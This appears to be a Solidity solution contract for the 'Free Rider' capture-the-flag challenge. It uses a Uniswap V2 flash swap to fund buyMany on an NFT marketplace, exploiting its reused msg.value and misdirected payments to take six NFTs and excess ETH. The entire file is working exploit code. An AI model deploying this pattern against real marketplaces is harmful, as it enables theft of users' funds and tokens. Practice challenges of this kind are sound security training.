// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";

interface _WETH {
    function deposit() external payable;
    function withdraw(uint amount) external;
    function transfer(address to, uint amount) external returns (bool);
}

interface UniswapV2Pair {
    function swap(
        uint amount0Out, 
        uint amount1Out, 
        address to, 
        bytes calldata data
    ) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender, 
        uint amount0, 
        uint /*amount1*/, 
        bytes calldata /*data*/
    ) external;
}

contract SaviorFreeRider is IUniswapV2Callee, IERC721Receiver {
    _WETH public immutable weth;
    UniswapV2Pair public immutable pair;
    FreeRiderNFTMarketplace public immutable marketplace;
    ERC721 public immutable nft;
    address payable immutable public player;

    constructor (
        address payable _weth,
        address _pair,
        address payable _marketplace,
        address _nft
    ) {
        weth = _WETH(_weth);
        pair = UniswapV2Pair(_pair);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        nft = ERC721(_nft);
        player = payable(msg.sender);
    }

    function save() external payable {
        weth.deposit{value: msg.value}();
        weth.transfer(address(pair), msg.value);

        bytes memory data = abi.encode('Enable');
        pair.swap(15 ether, 0, address(this), data);
    }

    error WrongCaller();
    function uniswapV2Call(
        address sender, 
        uint amount0, 
        uint /*amount1*/, 
        bytes calldata /*data*/
    ) external {
        if(sender != address(this)) revert WrongCaller();

        weth.withdraw(amount0);

        uint[] memory ids = new uint[](6);
        for(uint i=0; i<6; i++)
            ids[i] = i;
        marketplace.buyMany{value: amount0}(ids);
        
        for(uint i=0; i<6; i++)
            nft.transferFrom(address(this), player, i);
        
        uint extra = address(this).balance - amount0;
        player.transfer(extra);

        weth.deposit{value: amount0}();
        weth.transfer(address(pair), amount0);
    }

    function onERC721Received(
        address /*operator*/,
        address /*from*/,
        uint256 /*tokenId*/,
        bytes calldata /*data*/
    ) external pure returns (bytes4) {
        return  IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
